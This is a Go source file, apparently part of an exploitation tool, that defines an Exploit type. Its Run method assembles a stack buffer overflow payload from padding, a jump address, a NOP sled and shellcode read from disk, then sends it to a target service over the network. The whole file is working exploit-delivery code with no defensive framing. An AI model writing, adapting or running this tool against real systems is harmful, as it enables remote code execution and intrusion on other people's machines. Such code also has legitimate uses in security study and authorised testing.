package overflow

import (
    "fmt"
    "net"
    "io/ioutil"
)

// ...
type Exploit struct {
    offset  int
    jump    string
    reverse bool
    nops    int
    shell   string
}

// ...
func NewExploit(offset int, jump string, reverse bool, nops int,
        shell string) Exploit {
    return Exploit{ offset, jump, reverse, nops, shell }
}

// ...
func (e Exploit) Run(host Host, tmpl string) {
    // generate overflow and nopslide
    pad := generateBytes(0x41, e.offset)
    slide := generateBytes(0x90, e.nops)

    // check jump address is correct length
    fmt.Println(" > Parsing jump address.")
    if len(e.jump) != 16 {
        fmt.Printf("\n Error! invalid jump address '%s'\n", e.jump)
        return
    }

    // decode jump address
    addr, err := parseHex(e.jump)
    if err != nil {
        fmt.Printf("\n Error! invalid jump address '%s'\n", e.jump)
        return
    }

    // reverse endianness if specified
    if e.reverse {
        reverseBytes(addr)
    }

    // read shell
    fmt.Println(" > Reading shellcode.")
    shell, err := ioutil.ReadFile(e.shell)
    if err != nil {
        fmt.Printf("\n Error! couldn't read file '%s'\n", e.shell)
        return
    }

    // construct payload (pad + jump + slide + shell)
    data := append(pad, addr...)
    data = append(data, slide...)
    data = append(data, shell...)

    // build payload
    fmt.Println(" > Building payload.")
    payload := Payload{ data, tmpl }

    // send payload to target service
    fmt.Printf(" > Sending %d-byte payload.\n", payload.Size())
    if err = host.SendPayload(payload); err != nil {
        fmt.Printf("\n Error! %s\n", err.(*net.OpError).Err)
        return
    }

    // notify user that the payload was successfully delivered
    fmt.Println("\n Success! No errors found.")
}

